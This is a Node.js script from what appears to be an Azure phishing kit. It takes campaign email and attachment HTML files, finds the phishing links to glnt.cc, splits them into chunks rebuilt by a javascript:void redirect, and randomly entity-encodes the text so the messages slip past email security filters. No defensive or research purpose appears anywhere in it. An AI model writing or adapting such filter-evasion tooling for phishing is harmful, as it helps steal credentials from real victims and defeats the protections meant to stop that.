#!/usr/bin/env node
const fs = require('fs');
const path = require('path');

const CAMPAIGN_DIR = '/Users/sk_hga/azure-phish-kit/campaign-emails';
const OBFUSCATED_DIR = '/Users/sk_hga/azure-phish-kit/campaign-emails-obfuscated';

fs.mkdirSync(`${OBFUSCATED_DIR}/email`, { recursive: true });
fs.mkdirSync(`${OBFUSCATED_DIR}/attachments`, { recursive: true });

function entityShuffle(text) {
    let result = '';
    for (const c of text) {
        if (Math.random() < 0.10 && /[a-zA-Z]/.test(c)) {
            result += `&#${c.charCodeAt(0)};`;
        } else {
            result += c;
        }
    }
    return result;
}

for (const subdir of ['email', 'attachments']) {
    const dir = path.join(CAMPAIGN_DIR, subdir);
    const files = fs.readdirSync(dir).filter(f => f.endsWith('.html')).sort();

    for (const name of files) {
        const filePath = path.join(dir, name);
        let html = fs.readFileSync(filePath, 'utf8');

        const linkMatch = html.match(/https:\/\/glnt\.cc\/[^\x22\x27\s<>]+/);
        const phishLink = linkMatch ? linkMatch[0] : '';

        if (phishLink) {
            const chunks = [];
            for (let i = 0; i < phishLink.length; i += 20) {
                chunks.push(phishLink.substring(i, i + 20));
            }
            const chunkStr = chunks.map(c => `'${c}'`).join(',');
            const jsDecode = `javascript:void((function(){var p=[${chunkStr}];location.href=p.join('')})())`;
            html = html.replace(phishLink, jsDecode);
        }

        html = html.replace(/>([^<]{4,})</g, (match, text) => '>' + entityShuffle(text) + '<');
        html = html.replace(/javascript:void/g, 'jav&#97;script:void');

        const outPath = path.join(OBFUSCATED_DIR, subdir, name);
        fs.writeFileSync(outPath, html);
        console.log(`  ${subdir}/${name} ✓`);
    }
}
console.log('Done');
